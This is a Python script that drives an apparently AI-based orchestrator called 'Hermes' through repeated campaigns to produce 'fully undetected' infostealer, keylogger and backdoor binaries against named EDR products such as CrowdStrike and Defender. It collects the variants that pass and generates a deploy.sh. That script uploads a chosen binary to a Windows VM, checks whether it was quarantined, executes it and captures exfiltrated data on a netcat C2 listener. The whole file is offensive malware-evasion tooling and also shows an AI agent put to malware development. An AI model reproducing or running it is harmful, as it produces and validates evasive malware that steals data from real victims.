#!/usr/bin/env python3
"""FUD Collection Runner — drives Hermes campaigns to collect FUD variants.

Usage:
    python3 scripts/fud_collector.py --type infostealer --count 10
    python3 scripts/fud_collector.py --all --count 10
"""

import argparse
import asyncio
import json
import logging
import os
import shutil
import sys
import time
from datetime import datetime
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from hermes.orchestrator import Hermes
from hermes.config import get_config

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(name)s] %(levelname)s: %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("fud_collector")

FRAMEWORK_ROOT = Path(__file__).parent.parent
RESULTS_DIR = FRAMEWORK_ROOT / "results"


class FUDCollector:
    """Runs Hermes campaigns and collects FUD (Fully Undetected) variants."""

    def __init__(self, malware_type: str, target_count: int = 10,
                 max_campaigns: int = 100, edr: str = "crowdstrike"):
        self.malware_type = malware_type
        self.target_count = target_count
        self.max_campaigns = max_campaigns
        self.edr = edr
        self.fuds: list[dict] = []
        self.failures: list[dict] = []
        self.collection_dir = RESULTS_DIR / f"fud_collection_{malware_type}_{datetime.now():%Y%m%d_%H%M%S}"
        self.collection_dir.mkdir(parents=True, exist_ok=True)

    def _find_latest_hermes_result(self) -> Path | None:
        """Find the most recent hermes_* result directory."""
        hermes_dirs = sorted(
            [d for d in RESULTS_DIR.iterdir()
             if d.is_dir() and d.name.startswith("hermes_")],
            key=lambda p: p.stat().st_mtime,
            reverse=True,
        )
        return hermes_dirs[0] if hermes_dirs else None

    def _extract_fud_info(self, result_dir: Path, campaign_num: int,
                          campaign_result: dict) -> dict | None:
        """Extract FUD information from a successful campaign result directory."""
        exe_files = list(result_dir.glob("*.exe"))
        js_files = list(result_dir.glob("*.js"))
        c_files = list(result_dir.glob("*.c"))

        binary = exe_files[0] if exe_files else (js_files[0] if js_files else None)
        source = c_files[0] if c_files else (js_files[0] if js_files else None)

        if not binary:
            return None

        recipe_name = result_dir.name.replace("hermes_", "").rsplit("_", 2)[0]

        return {
            "id": len(self.fuds) + 1,
            "campaign": campaign_num,
            "recipe": recipe_name,
            "binary_path": str(binary),
            "binary_name": binary.name,
            "binary_size": binary.stat().st_size,
            "source_path": str(source) if source else None,
            "format": "jscript" if binary.suffix == ".js" else "pe",
            "result_dir": str(result_dir),
            "timestamp": datetime.now().isoformat(),
            "edr": self.edr,
            "malware_type": self.malware_type,
        }

    def _copy_fud_to_collection(self, fud_info: dict) -> None:
        """Copy FUD files to the collection directory."""
        fud_subdir = self.collection_dir / f"fud_{fud_info['id']:02d}_{fud_info['recipe']}"
        fud_subdir.mkdir(parents=True, exist_ok=True)

        if fud_info["binary_path"] and Path(fud_info["binary_path"]).exists():
            shutil.copy2(fud_info["binary_path"], fud_subdir / Path(fud_info["binary_path"]).name)

        if fud_info.get("source_path") and Path(fud_info["source_path"]).exists():
            shutil.copy2(fud_info["source_path"], fud_subdir / "source" + Path(fud_info["source_path"]).suffix)

        result_dir = Path(fud_info["result_dir"])
        for f in result_dir.iterdir():
            if f.is_file() and f.name not in (Path(fud_info["binary_path"]).name,):
                shutil.copy2(f, fud_subdir / f.name)

        info_path = fud_subdir / "info.json"
        info_path.write_text(json.dumps(fud_info, indent=2))

    async def run_campaign(self, campaign_num: int) -> bool:
        """Run a single Hermes campaign. Returns True if a FUD was found."""
        logger.info("=" * 60)
        logger.info("Campaign %d/%d for %s (have %d/%d FUDs)",
                     campaign_num, self.max_campaigns,
                     self.malware_type, len(self.fuds), self.target_count)
        logger.info("=" * 60)

        target_spec = {
            "os": "windows11",
            "edr": self.edr,
            "malware_type": self.malware_type,
            "network": "nat",
        }
        config = {
            "max_rounds": 50,
            "batch_size": 3,
        }

        hermes = Hermes(target_spec, config)

        def on_progress(event_type, data):
            if event_type == "round_start":
                logger.info("  Round %d/%d", data["round"], data["max_rounds"])
            elif event_type == "tool_call":
                logger.info("  -> %s", data["name"])
            elif event_type == "tool_result":
                preview = data["result"][:150].replace("\n", " ")
                logger.info("  <- %s", preview)
            elif event_type == "reasoning":
                logger.info("  Hermes: %s", data["text"][:200])

        hermes.on_progress(on_progress)

        try:
            result = await hermes.run()
        except Exception as e:
            logger.error("Campaign %d crashed: %s", campaign_num, e)
            self.failures.append({
                "campaign": campaign_num,
                "error": str(e),
                "timestamp": datetime.now().isoformat(),
            })
            return False

        latest = self._find_latest_hermes_result()
        if not latest:
            logger.warning("No result directory found for campaign %d", campaign_num)
            self.failures.append({
                "campaign": campaign_num,
                "error": "no result directory",
                "timestamp": datetime.now().isoformat(),
            })
            return False

        recipe_results_path = RESULTS_DIR / "recipe_results.json"
        if recipe_results_path.exists():
            rr = json.loads(recipe_results_path.read_text())
            results = rr.get("results", [])
            if results:
                last = results[-1]
                if last.get("verdict") == "PASS":
                    fud_info = self._extract_fud_info(latest, campaign_num, result)
                    if fud_info:
                        self.fuds.append(fud_info)
                        self._copy_fud_to_collection(fud_info)
                        logger.info("FUD #%d found! Recipe: %s, Size: %d bytes",
                                     fud_info["id"], fud_info["recipe"], fud_info["binary_size"])
                        return True
                else:
                    logger.info("Campaign %d failed: %s", campaign_num, last.get("verdict"))
                    self.failures.append({
                        "campaign": campaign_num,
                        "verdict": last.get("verdict"),
                        "recipe": last.get("recipe"),
                        "timestamp": datetime.now().isoformat(),
                    })

        return False

    def generate_report(self) -> str:
        """Generate a markdown report of all collected FUDs."""
        lines = [
            f"# FUD Collection Report — {self.malware_type}",
            f"",
            f"**Date:** {datetime.now():%Y-%m-%d %H:%M}",
            f"**EDR:** {self.edr}",
            f"**FUDs Found:** {len(self.fuds)}/{self.target_count}",
            f"**Total Campaigns:** {len(self.fuds) + len(self.failures)}",
            f"**Success Rate:** {len(self.fuds) / max(1, len(self.fuds) + len(self.failures)) * 100:.1f}%",
            f"",
            f"## FUD Variants",
            f"",
        ]

        for fud in self.fuds:
            lines.extend([
                f"### FUD #{fud['id']} — {fud['recipe']}",
                f"",
                f"| Property | Value |",
                f"|----------|-------|",
                f"| Format | {fud['format'].upper()} |",
                f"| Binary | `{fud['binary_name']}` |",
                f"| Size | {fud['binary_size']:,} bytes |",
                f"| Recipe | `{fud['recipe']}` |",
                f"| Campaign # | {fud['campaign']} |",
                f"",
            ])

        if self.failures:
            lines.extend([
                f"## Failed Campaigns ({len(self.failures)})",
                f"",
            ])
            for f in self.failures[:20]:
                lines.append(f"- Campaign {f['campaign']}: {f.get('verdict', f.get('error', 'unknown'))}")
            lines.append("")

        return "\n".join(lines)

    def generate_deploy_script(self) -> str:
        """Generate an interactive deploy script for the collected FUDs."""
        script = '''#!/bin/bash
# Interactive FUD Deployment Script
# Generated: ''' + datetime.now().strftime("%Y-%m-%d %H:%M") + '''
# Type: ''' + self.malware_type + '''
# EDR Target: ''' + self.edr + '''

set -e

VM_PORT="${VM_PORT:-10022}"
VM_USER="${VM_USER:-vmuser}"
VM_PASS="${VM_PASS:-vmuser123}"
C2_PORT="${C2_PORT:-9001}"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

SSH_CMD="sshpass -p '$VM_PASS' ssh -o StrictHostKeyChecking=no -p $VM_PORT $VM_USER@localhost"
SCP_CMD="sshpass -p '$VM_PASS' scp -o StrictHostKeyChecking=no -P $VM_PORT"

RED='\\033[0;31m'
GREEN='\\033[0;32m'
YELLOW='\\033[1;33m'
CYAN='\\033[0;36m'
BOLD='\\033[1m'
NC='\\033[0m'

echo ""
echo -e "${BOLD}╔══════════════════════════════════════════════════╗${NC}"
echo -e "${BOLD}║     FUD DEPLOYMENT — ''' + self.malware_type.upper() + '''${NC}"
echo -e "${BOLD}║     Target EDR: ''' + self.edr.upper() + '''${NC}"
echo -e "${BOLD}╚══════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${CYAN}Available FUD variants:${NC}"
echo ""

'''

        for i, fud in enumerate(self.fuds, 1):
            script += f'''echo -e "  ${{BOLD}}{i}${{NC}}) {fud['recipe']}"
echo -e "     Format: {fud['format'].upper()} | Size: {fud['binary_size']:,} bytes"
echo ""
'''

        script += '''
echo -e "  ${BOLD}0${NC}) Exit"
echo ""

read -p "Select variant to deploy [1-''' + str(len(self.fuds)) + ''']: " CHOICE

case $CHOICE in
    0) echo "Exiting."; exit 0 ;;
'''

        for i, fud in enumerate(self.fuds, 1):
            binary_name = Path(fud["binary_path"]).name
            fud_dir = f"fud_{fud['id']:02d}_{fud['recipe']}"

            if fud["format"] == "jscript":
                exec_cmd = f'cscript //nologo //E:jscript "C:\\\\Users\\\\$VM_USER\\\\Desktop\\\\{binary_name}"'
                c2_proto = "http"
            elif "backdoor" in fud["recipe"]:
                exec_cmd = f'"C:\\\\Users\\\\$VM_USER\\\\Desktop\\\\{binary_name}"'
                c2_proto = "backdoor"
            else:
                exec_cmd = f'"C:\\\\Users\\\\$VM_USER\\\\Desktop\\\\{binary_name}"'
                c2_proto = "tcp"

            script += f'''    {i})
        BINARY="$SCRIPT_DIR/{fud_dir}/{binary_name}"
        REMOTE_NAME="{binary_name}"
        EXEC_CMD='{exec_cmd}'
        echo -e "${{GREEN}}Selected: {fud['recipe']}${{NC}}"
        ;;
'''

        script += '''    *) echo -e "${RED}Invalid choice${NC}"; exit 1 ;;
esac

# Step 1: Check VM
echo ""
echo -e "${YELLOW}[1/5] Checking VM connectivity...${NC}"
if ! eval $SSH_CMD "echo ok" >/dev/null 2>&1; then
    echo -e "${RED}  ✗ VM not reachable on port $VM_PORT${NC}"
    exit 1
fi
echo -e "${GREEN}  ✓ VM is alive${NC}"

# Step 2: Upload
echo -e "${YELLOW}[2/5] Uploading binary...${NC}"
eval $SCP_CMD "$BINARY" "$VM_USER@localhost:'C:\\Users\\$VM_USER\\Desktop\\$REMOTE_NAME'" 2>/dev/null
echo -e "${GREEN}  ✓ Uploaded${NC}"

# Step 3: Verify not quarantined
echo -e "${YELLOW}[3/5] Checking if EDR quarantined...${NC}"
sleep 3
EXISTS=$(eval $SSH_CMD "if exist \\"C:\\Users\\$VM_USER\\Desktop\\$REMOTE_NAME\\" (echo EXISTS) else (echo GONE)" 2>/dev/null | tr -d '\\r')
if [ "$EXISTS" = "GONE" ]; then
    echo -e "${RED}  ✗ QUARANTINED by EDR${NC}"
    exit 2
fi
echo -e "${GREEN}  ✓ Binary survived EDR static scan${NC}"

# Step 4: Start C2 and execute
echo -e "${YELLOW}[4/5] Starting C2 listener and executing...${NC}"
fuser -k $C2_PORT/tcp 2>/dev/null
sleep 1
C2_OUT="$SCRIPT_DIR/c2_capture_$(date +%Y%m%d_%H%M%S).bin"
timeout 120 nc -l -p $C2_PORT > "$C2_OUT" &
C2_PID=$!
sleep 1
eval $SSH_CMD "$EXEC_CMD" >/dev/null 2>&1 &
EXEC_PID=$!

# Progress bar
ELAPSED=0
while kill -0 $C2_PID 2>/dev/null; do
    ELAPSED=$((ELAPSED + 1))
    if [ $ELAPSED -gt 120 ]; then break; fi
    printf "\\r  Waiting for C2 data... %ds" "$ELAPSED"
    sleep 1
done
echo ""

# Step 5: Results
SIZE=$(stat -c%s "$C2_OUT" 2>/dev/null || echo 0)
echo -e "${YELLOW}[5/5] Results:${NC}"
echo "  ─────────────────────────────────"
echo "  File: $C2_OUT"
echo "  Size: $SIZE bytes"
if [ "$SIZE" -gt 100 ]; then
    echo -e "  Status: ${GREEN}✓ SUCCESS — data exfiltrated${NC}"
    echo ""
    echo "  Sections:"
    strings "$C2_OUT" | grep -E "^\\[" | head -20 | sed 's/^/    /'
else
    echo -e "  Status: ${RED}✗ No C2 data received${NC}"
fi
echo "  ─────────────────────────────────"

# Cleanup
echo ""
echo -e "${YELLOW}Cleaning up VM...${NC}"
eval $SSH_CMD "taskkill /f /im $REMOTE_NAME 2>nul & del \\"C:\\Users\\$VM_USER\\Desktop\\$REMOTE_NAME\\" 2>nul" >/dev/null 2>&1
echo -e "${GREEN}  ✓ Cleaned${NC}"
'''
        return script

    async def collect(self) -> dict:
        """Main collection loop — runs campaigns until target_count FUDs found."""
        logger.info("Starting FUD collection for %s (target: %d, max campaigns: %d)",
                     self.malware_type, self.target_count, self.max_campaigns)

        for campaign_num in range(1, self.max_campaigns + 1):
            if len(self.fuds) >= self.target_count:
                logger.info("Target reached: %d FUDs collected!", len(self.fuds))
                break

            success = await self.run_campaign(campaign_num)

            if success:
                logger.info("FUD count: %d/%d", len(self.fuds), self.target_count)

            await asyncio.sleep(2)

        report = self.generate_report()
        report_path = self.collection_dir / "REPORT.md"
        report_path.write_text(report)

        deploy_script = self.generate_deploy_script()
        deploy_path = self.collection_dir / "deploy.sh"
        deploy_path.write_text(deploy_script)
        os.chmod(str(deploy_path), 0o755)

        manifest = {
            "malware_type": self.malware_type,
            "edr": self.edr,
            "fuds_found": len(self.fuds),
            "target_count": self.target_count,
            "total_campaigns": campaign_num,
            "fuds": self.fuds,
            "failures_count": len(self.failures),
            "collection_dir": str(self.collection_dir),
            "timestamp": datetime.now().isoformat(),
        }
        manifest_path = self.collection_dir / "manifest.json"
        manifest_path.write_text(json.dumps(manifest, indent=2))

        logger.info("Collection complete: %d/%d FUDs in %s",
                     len(self.fuds), self.target_count, self.collection_dir)

        return manifest


async def main():
    parser = argparse.ArgumentParser(description="FUD Collection Runner")
    parser.add_argument("--type", default="infostealer",
                        choices=["infostealer", "keylogger", "backdoor"],
                        help="Malware type")
    parser.add_argument("--all", action="store_true",
                        help="Collect for all malware types")
    parser.add_argument("--count", type=int, default=10,
                        help="FUDs to collect per type (default: 10)")
    parser.add_argument("--max-campaigns", type=int, default=100,
                        help="Max campaigns per type (default: 100)")
    parser.add_argument("--edr", default="crowdstrike",
                        choices=["crowdstrike", "defender", "elastic", "none"],
                        help="Target EDR")
    args = parser.parse_args()

    types = ["infostealer", "keylogger", "backdoor"] if args.all else [args.type]
    all_results = {}

    for mtype in types:
        collector = FUDCollector(
            malware_type=mtype,
            target_count=args.count,
            max_campaigns=args.max_campaigns,
            edr=args.edr,
        )
        result = await collector.collect()
        all_results[mtype] = result

    if len(types) > 1:
        combined_dir = RESULTS_DIR / f"fud_collection_all_{datetime.now():%Y%m%d_%H%M%S}"
        combined_dir.mkdir(parents=True, exist_ok=True)
        combined_manifest = {
            "types": types,
            "edr": args.edr,
            "results": all_results,
            "timestamp": datetime.now().isoformat(),
        }
        (combined_dir / "manifest.json").write_text(json.dumps(combined_manifest, indent=2))
        logger.info("Combined results in %s", combined_dir)

    total_fuds = sum(r.get("fuds_found", 0) for r in all_results.values())
    logger.info("Grand total: %d FUDs across %d types", total_fuds, len(types))


if __name__ == "__main__":
    asyncio.run(main())
